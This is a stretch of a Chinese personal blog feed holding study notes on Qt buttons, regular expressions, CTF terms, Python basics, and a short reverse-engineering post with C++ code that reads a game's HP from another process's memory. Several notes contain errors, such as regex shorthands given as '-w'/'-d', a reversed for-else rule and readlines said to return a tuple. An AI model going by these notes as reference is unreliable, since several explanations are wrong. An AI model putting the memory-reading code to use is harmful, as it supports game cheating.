&#123;<br>    <span class="hljs-keyword">if</span> (ui.arrowBtn-&gt;<span class="hljs-built_in">arrowType</span>() == Qt::UpArrow) &#123;<br>        ui.arrowBtn-&gt;<span class="hljs-built_in">setArrowType</span>(Qt::DownArrow);<br>        ui.arrowBtn-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;向下&quot;</span>);<br>        ui.arrowBtn-&gt;<span class="hljs-built_in">setToolButtonStyle</span>(Qt::ToolButtonTextUnderIcon);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        ui.arrowBtn-&gt;<span class="hljs-built_in">setArrowType</span>(Qt::UpArrow);<br>        ui.arrowBtn-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;向上&quot;</span>);<br>        ui.arrowBtn-&gt;<span class="hljs-built_in">setToolButtonStyle</span>(Qt::ToolButtonTextUnderIcon);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>由于这个button和pushButton的效果都差不多，就只描述了不一样的一些东西</p><p>下面是他们的样子</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/qt/%E6%8E%A7%E4%BB%B6image-20230803142206611.png" alt="image-20230803142206611"></p></li><li><p>弹出菜单的形式以及clicked信号的捕捉</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++">    <span class="hljs-comment">// toolButton   弹出菜单</span><br>    ui.menuToolBtn-&gt;<span class="hljs-built_in">setMenu</span>(menuForwithMenu);<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">弹出菜单的弹出模式是一个枚举类型: QToolButton::ToolButtonPopupMode, 取值如下:</span><br><span class="hljs-comment">    - QToolButton::DelayedPopup:</span><br><span class="hljs-comment">        - 延时弹出, 按压工具按钮一段时间后才能弹出, 比如:浏览器的返回按钮</span><br><span class="hljs-comment">        - 长按按钮菜单弹出, 但是按钮的 clicked 信号不会被发射</span><br><span class="hljs-comment">    - QToolButton::MenuButtonPopup:</span><br><span class="hljs-comment">        - 在这种模式下，工具按钮会显示一个特殊的箭头，表示有菜单。</span><br><span class="hljs-comment">    - 当按下按钮的箭头部分时，将显示菜单。按下按钮部分发射 clicked 信号</span><br><span class="hljs-comment">    - QToolButton::InstantPopup:</span><br><span class="hljs-comment">        - 当按下工具按钮时，菜单立即显示出来。</span><br><span class="hljs-comment">        - 在这种模式下，按钮本身的动作不会被触发(不会发射clicked信号</span><br><span class="hljs-comment">*/</span><br>    <span class="hljs-comment">//检测什么时候有信号</span><br>    ui.menuToolBtn-&gt;<span class="hljs-built_in">setPopupMode</span>(QToolButton::InstantPopup);<br>    <span class="hljs-built_in">connect</span>(ui.menuToolBtn, &amp;QToolButton::clicked, <span class="hljs-keyword">this</span>, [=]() &#123;<br>        QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;成功&quot;</span>, <span class="hljs-string">&quot;检查到信号&quot;</span>);<br>        &#125;);<br>   <br>    <span class="hljs-comment">//检查结果，默认的延迟菜单，当点击的时候有信号但是我们长安的时候没有信号(QToolButton::DelayedPopup:)</span><br>    <span class="hljs-comment">// 当带有箭头的按钮的时候，点击非按钮区有信号，点击箭头没有信号(    - QToolButton::MenuButtonPopup:)</span><br>    <span class="hljs-comment">// 无论什么形式的点击都不会有信号（QToolButton::InstantPopup:） </span><br>    <span class="hljs-comment">//</span><br>   <br></code></pre></td></tr></table></figure></li></ol><h3 id="QRadioButton"><a href="#QRadioButton" class="headerlink" title="QRadioButton"></a>QRadioButton</h3><p>这个按钮是一个单选按钮，没有自己的信号，槽函数，和公共函数，所有的东西都是继承于<code>QAbstractButton</code>,主要是用于按钮组当中</p><p>对于单选按钮的分组，通常将按钮放置于不同的容器当中，每个容器当中的按钮就是一组</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/qt1/image-20230811211222605.png" alt="image-20230811211222605"></p><p>通常使用下面这个容器，因为可以提供标题</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/qt1/image-20230811212108272.png" alt="image-20230811212108272"></p><h3 id="QCheckBox"><a href="#QCheckBox" class="headerlink" title="QCheckBox"></a>QCheckBox</h3><p>复选框按钮，也就是支持多选</p><p>对于单选按钮来说，QCheckBox支持选中后取消选中</p>]]></content>
    
    
    
    <tags>
      
      <tag>QT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>webshell原理</title>
    <link href="/2023/08/01/others/powershell%E5%8E%9F%E7%90%86/"/>
    <url>/2023/08/01/others/powershell%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><h2 id="web的工作原理"><a href="#web的工作原理" class="headerlink" title="web的工作原理"></a>web的工作原理</h2><h3 id="GET和POST传参"><a href="#GET和POST传参" class="headerlink" title="GET和POST传参"></a>GET和POST传参</h3><ol><li>GET传参是从url网址的后面传入</li></ol><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/webshell/image-20230801145504139.png" alt="image-20230801145504139"></p><h2 id="远控木马"><a href="#远控木马" class="headerlink" title="远控木马"></a>远控木马</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/webshell/image-20230801145820858.png" alt="image-20230801145820858"></p>]]></content>
    
    
    
    <tags>
      
      <tag>安全研发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式</title>
    <link href="/2023/07/31/web/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2023/07/31/web/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><ol><li><p>使用[]进行匹配</p></li><li><p>可以使用区间的方式</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/%E5%8C%BA%E9%97%B4%E8%A7%84%E5%88%991" alt="image-20230801084705729"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/%E5%8C%BA%E9%97%B4%E6%B5%8B%E8%AF%95" alt="image-20230801084751543"></p></li><li><p>使用转义字符进行转义</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6" alt="image-20230801084903442"></p></li><li><p>使用取反操作</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/%E5%8F%96%E5%8F%8D" alt="image-20230801085043193"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/%E5%8F%96%E5%8F%8D%E6%93%8D%E4%BD%9C" alt="image-20230801085129023"></p></li></ol><h2 id="快捷键的匹配"><a href="#快捷键的匹配" class="headerlink" title="快捷键的匹配"></a>快捷键的匹配</h2><ol><li><p>匹配字母和数字</p><p>匹配字母：<code>-w</code></p><p>匹配数字：<code>-d</code></p></li><li><p>匹配空白</p><p><code>\s</code></p><p><img src="C:\Users\12414\Desktop\hexo\source_posts\web\正则表达式.assets\image-20230801085446374.png" alt="image-20230801085446374"></p></li><li><p>匹配单词的边界</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/%E5%8C%B9%E9%85%8D%E5%8D%95%E8%AF%8D%E8%BE%B9%E7%95%8C%E7%A4%BA%E4%BE%8B" alt="image-20230801085844782"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/%E5%8C%B9%E9%85%8D%E5%8D%95%E8%AF%8D%E7%BB%83%E4%B9%A0" alt="image-20230801085915050"></p></li><li><p>快捷键取反操作</p><p>就是改小写为大写</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801090459948.png" alt="image-20230801090459948"></p></li><li><p>匹配字符串的结尾和开头</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801123354332.png" alt="image-20230801123354332"></p></li><li><p>匹配任何单个字符</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801123539593.png" alt="image-20230801123539593"></p></li><li><p>匹配一次或0次</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801123809867.png" alt="image-20230801123809867"></p></li><li><p>重复</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801124258603.png" alt="image-20230801124258603"></p></li><li><p>重复区间</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801124425850.png" alt="image-20230801124425850"></p></li><li><p>区间范围</p></li></ol><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801124728907.png" alt="image-20230801124728907"></p><h2 id="进阶笔记"><a href="#进阶笔记" class="headerlink" title="进阶笔记"></a>进阶笔记</h2><ol><li><p>分组</p><p>分组就是字面的意思，我们可以提取这一组的数据</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801141051642.png" alt="image-20230801141051642"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801141404234.png" alt="image-20230801141404234"></p></li><li><p>使用<code>or</code>或者<code>|</code>我们可以匹配多个</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801141605087.png" alt="image-20230801141605087"></p></li><li><p>使用<code>(?:)</code>实现非捕获分组，也就是说我们可以匹配但是我们捕获获取</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801141734353.png" alt="image-20230801141734353"></p></li><li><p>分组回溯的使用</p><p>简单的就是引用前面的分组</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801142113479.png" alt="image-20230801142113479"></p><p>下面是一个列题</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801142434498.png" alt="image-20230801142434498"></p></li><li><p>正向先行断言</p><p>先行都是判断词在后面，正向就是说符合匹配</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801142638894.png" alt="image-20230801142638894"></p></li><li><p>反向先行断言</p><p>先行都是判断词在后面，反向就是说不符合匹配</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801142928705.png" alt="image-20230801142928705"></p></li><li><p>正向后行断言</p><p>后行都是判断词在前面，正向就是说符合匹配</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801143053853.png" alt="image-20230801143053853"></p></li><li><p>反向后行断言</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801143358287.png" alt="image-20230801143358287"></p></li></ol><h2 id="小知识点补充"><a href="#小知识点补充" class="headerlink" title="小知识点补充"></a>小知识点补充</h2><ol><li><code>?</code>当遇到{}的时候，没有加<code>？</code>就是贪婪模式，也就是如果有的话会取到后面。非贪婪只会匹配最小值，后面符合都不会在匹配</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF名词积累</title>
    <link href="/2023/07/27/CTF/CTF%E5%90%8D%E8%AF%8D%E7%A7%AF%E7%B4%AF/"/>
    <url>/2023/07/27/CTF/CTF%E5%90%8D%E8%AF%8D%E7%A7%AF%E7%B4%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><ol><li><p>url加密</p><p>可以理解为使用对应的两位16进制ascii码值加上%u</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ida的使用</title>
    <link href="/2023/07/24/%E9%80%86%E5%90%91/ida%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/07/24/%E9%80%86%E5%90%91/ida%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="IDA的使用"><a href="#IDA的使用" class="headerlink" title="IDA的使用"></a>IDA的使用</h1>]]></content>
    
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反外挂</title>
    <link href="/2023/07/24/%E9%80%86%E5%90%91/%E5%8F%8D%E5%A4%96%E6%8C%82/"/>
    <url>/2023/07/24/%E9%80%86%E5%90%91/%E5%8F%8D%E5%A4%96%E6%8C%82/</url>
    
    <content type="html"><![CDATA[<h1 id="逆向分析入门"><a href="#逆向分析入门" class="headerlink" title="逆向分析入门"></a>逆向分析入门</h1><h2 id="搜索血量-主要是使用CE软件"><a href="#搜索血量-主要是使用CE软件" class="headerlink" title="搜索血量(主要是使用CE软件)"></a>搜索血量(主要是使用CE软件)</h2><h3 id="内存搜索"><a href="#内存搜索" class="headerlink" title="内存搜索"></a>内存搜索</h3><ol><li><p>内存的分类</p><p>物理内存和虚拟内存</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/reverse/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/image-20230724100903047.png" alt="image-20230724100903047"></p><p>每一个进程都都有自己的专属的内存的，所以我们使用CE就可可以查看到对应的虚拟内存</p></li><li><p>使用CE搜索看不到的数据</p><p>通过搜索一个整体相关的内存，进行内存分析</p><p>通过类型进行判断分析内存的信息 </p></li><li><p>使用cpp探索血量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br>   <br>   <br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br>   <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    DWORD pid;<br>    <span class="hljs-type">int</span> HP&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;请输入游戏的进程: &quot;</span> &lt;&lt; std::endl;<br>        std::cin &gt;&gt; pid;<br>        HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);<br>        <span class="hljs-keyword">if</span> (hProcess) &#123;<br>            SIZE_T readByte&#123;<span class="hljs-number">0</span>&#125;;<br>            BOOL BRet = <span class="hljs-built_in">ReadProcessMemory</span>(hProcess, (LPVOID) <span class="hljs-number">0x004B6CC4</span>, &amp;HP, <span class="hljs-built_in">sizeof</span>(HP), &amp;readByte);<br>            <span class="hljs-keyword">if</span> (BRet) &#123;<br>                std::cout &lt;&lt; <span class="hljs-string">&quot;血量是：&quot;</span> &lt;&lt; HP &lt;&lt; std::endl;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                std::cout &lt;&lt; <span class="hljs-string">&quot;读取错误&quot;</span> &lt;&lt; std::endl;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            std::cout &lt;&lt; <span class="hljs-string">&quot;open process error &quot;</span> &lt;&lt; std::endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>HOOK技术</p><p>修改程序的执行流程的技术</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内存池</title>
    <link href="/2023/07/23/CPP%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/%E5%86%85%E5%AD%98%E6%B1%A0/"/>
    <url>/2023/07/23/CPP%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/%E5%86%85%E5%AD%98%E6%B1%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="内存池（slab）"><a href="#内存池（slab）" class="headerlink" title="内存池（slab）"></a>内存池（slab）</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li>&#96;</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>CPP开发组件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF技巧</title>
    <link href="/2023/07/20/CTF/CTF%E6%8A%80%E5%B7%A7/"/>
    <url>/2023/07/20/CTF/CTF%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><ol><li><p><code>xls</code>都当成ZIP解压。</p></li><li><p><code>Rc4</code>加密，解密。</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python随记</title>
    <link href="/2023/07/19/python/python%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/07/19/python/python%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h1><ol><li><p>使用count()可以记录元素出现的次数</p></li><li><p>发现字串出现的位置</p><p><code>find()</code></p></li></ol><h1 id="python的小数打印"><a href="#python的小数打印" class="headerlink" title="python的小数打印"></a>python的小数打印</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># print(&quot;%.2f&quot;%intNum)</span><br><span class="hljs-comment"># print(f&#x27;&#123;intNum:.2f&#125;&#x27;)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;:.2f&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(intNum))<br></code></pre></td></tr></table></figure><h1 id="控制进制"><a href="#控制进制" class="headerlink" title="控制进制"></a>控制进制</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">str16=<span class="hljs-built_in">input</span>()<br>int16=<span class="hljs-built_in">int</span>(str16,<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure><h1 id="list的部分操作"><a href="#list的部分操作" class="headerlink" title="list的部分操作"></a>list的部分操作</h1><ol><li>使用pop()弹出元素</li><li>使用reverse()反置</li></ol><h1 id="使用set检查是否有重复元素"><a href="#使用set检查是否有重复元素" class="headerlink" title="使用set检查是否有重复元素"></a>使用set检查是否有重复元素</h1><h1 id="range-的三种方式"><a href="#range-的三种方式" class="headerlink" title="range()的三种方式"></a>range()的三种方式</h1><ol><li><p>range(stop)</p></li><li><p>range(start,stop)</p></li><li><p>range(satrt,stop,step)</p><p>添加了步长</p></li></ol><h1 id="ord-和chr"><a href="#ord-和chr" class="headerlink" title="ord()和chr()"></a>ord()和chr()</h1><p>这是两个互逆的函数，使用ord返回int</p><p>使用chr返回字符</p><h1 id="从大到小的排序"><a href="#从大到小的排序" class="headerlink" title="从大到小的排序"></a>从大到小的排序</h1><ol><li><p>使用<code>reverse=True</code>参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">st.sort(key=<span class="hljs-keyword">lambda</span> x:x[<span class="hljs-number">4</span>],reverse=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure></li><li><p>添加<code>-</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">st.sort(key=<span class="hljs-keyword">lambda</span> x:(-x[<span class="hljs-number">4</span>],x[<span class="hljs-number">0</span>]))<br></code></pre></td></tr></table></figure></li></ol><h1 id="python-切片"><a href="#python-切片" class="headerlink" title="python 切片"></a>python 切片</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>a = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span>a<br>[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>a[:<span class="hljs-number">5</span>]<br>[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>a[<span class="hljs-number">5</span>:]<br>[<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>a[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>]<br>[<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>a[::<span class="hljs-number">2</span>]  <span class="hljs-comment"># 注意这个</span><br>[<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>a[::-<span class="hljs-number">1</span>] <span class="hljs-comment"># 注意这个</span><br>[<span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/%E9%9A%8F%E7%AC%94/image-20231123141022634.png" alt="image-20231123141022634"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">s=<span class="hljs-string">&quot;123456789&quot;</span><br><span class="hljs-built_in">print</span>(s[<span class="hljs-number">1</span>:-<span class="hljs-number">2</span>])<br><span class="hljs-comment"># 234567</span><br></code></pre></td></tr></table></figure><h1 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 如需要使用占位符，比如保持4个空格</span><br>i=<span class="hljs-number">12</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i:&lt;<span class="hljs-number">4</span>&#125;</span>&quot;</span>) <br><span class="hljs-comment"># 或者</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i:&gt;<span class="hljs-number">4</span>&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="os库随记"><a href="#os库随记" class="headerlink" title="os库随记"></a>os库随记</h1><h2 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h2><ol><li><p>abspath</p><p>返回绝对路径</p></li><li><p>mormpath</p><p>统一使用\</p></li><li><p>getcwd</p><p>获取当前的路径</p></li></ol><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><ol><li><p>system</p><p>创建一个进程</p></li></ol><h2 id="删除文件夹"><a href="#删除文件夹" class="headerlink" title="删除文件夹"></a>删除文件夹</h2><ol><li>删除文件<ul><li>若文件夹之下没有文件或者文件夹，可以只用<code>rmdir</code>但是有文件的话只能只用<code>rmtree</code></li></ul></li></ol><h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><p><code>remove()</code>删除文件</p><h2 id="查看文件路径下的文件"><a href="#查看文件路径下的文件" class="headerlink" title="查看文件路径下的文件"></a>查看文件路径下的文件</h2><ol><li><p>列出指定的文件夹当中的文件内容</p><p>listfiles()</p></li></ol><h2 id="查看是否是目录"><a href="#查看是否是目录" class="headerlink" title="查看是否是目录"></a>查看是否是目录</h2><p><code>isdir()</code>判断是否是系统已经存在的目录</p><h2 id="判断是否是文件"><a href="#判断是否是文件" class="headerlink" title="判断是否是文件"></a>判断是否是文件</h2><p><code>isfile()</code>判断是否是已经存在的文件</p><h1 id="with"><a href="#with" class="headerlink" title="with"></a>with</h1><ol><li>可以自动处理异常，关闭文件</li></ol><h1 id="倒叙输出"><a href="#倒叙输出" class="headerlink" title="倒叙输出"></a>倒叙输出</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;Alice&quot;</span><br><span class="hljs-built_in">print</span>(s[::–<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h1 id="字节流和字符流"><a href="#字节流和字符流" class="headerlink" title="字节流和字符流"></a>字节流和字符流</h1><p>使用文本文件打开的时候，这个时候使用的字符流。使用二进制打开的时候是字节流</p><h1 id="read读取方式"><a href="#read读取方式" class="headerlink" title="read读取方式"></a>read读取方式</h1><ol><li><p>readlines</p><p>返回一个元组，每一个元素都是一行</p></li><li><p>readline</p><p>返回一行</p></li><li><p>read</p><p>读取所有的内容返回一个字符串</p></li></ol><h1 id="读取的大小问题"><a href="#读取的大小问题" class="headerlink" title="读取的大小问题"></a>读取的大小问题</h1><p>Python 虽然可以处理任意大小的文件，但是处理大文件时可能会遇到内存限制问题。如果文件过大，可能会导致内存溢出或者其他相关错误。</p><h1 id="凯撒密码系列题"><a href="#凯撒密码系列题" class="headerlink" title="凯撒密码系列题"></a>凯撒密码系列题</h1><p>输入的数为n</p><p>i是对a-z的循环</p><p>那么移动的个数是(n+i-ord(‘a’))%26+ord(‘a’)</p><h1 id="计算标准差"><a href="#计算标准差" class="headerlink" title="计算标准差"></a>计算标准差</h1><p>std&#x3D;statistics.stdev(scs)</p><h1 id="for-x2F-while-else"><a href="#for-x2F-while-else" class="headerlink" title="for &#x2F; while + else"></a>for &#x2F; while + else</h1><p>只有当循环非正常退出才会执行else</p><p>这种情况下是<code>break</code></p><h1 id="print-x-y"><a href="#print-x-y" class="headerlink" title="print(x,y)"></a>print(x,y)</h1><p>中间是自带有括号的</p><h1 id="定义元组"><a href="#定义元组" class="headerlink" title="定义元组"></a>定义元组</h1><p>当只有一个元素的元组需要添加<code>,</code>字符</p><h1 id="文件打开方式"><a href="#文件打开方式" class="headerlink" 